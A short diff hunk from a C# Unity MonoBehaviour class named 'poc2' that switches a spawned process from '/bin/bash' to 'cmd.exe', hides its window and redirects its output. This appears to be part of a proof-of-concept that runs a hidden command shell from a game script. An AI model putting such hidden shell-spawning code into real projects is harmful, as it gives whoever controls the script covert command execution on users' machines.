@@ -38,7 +38,7 @@ public class poc2 : MonoBehaviour
 				StringBuilder strInput = new StringBuilder();
 
 				Process p = new Process();
-				p.StartInfo.FileName = "/bin/bash";
+				p.StartInfo.FileName = "cmd.exe";
 				p.StartInfo.CreateNoWindow = true;
 				p.StartInfo.UseShellExecute = false;
 				p.StartInfo.RedirectStandardOutput = true;
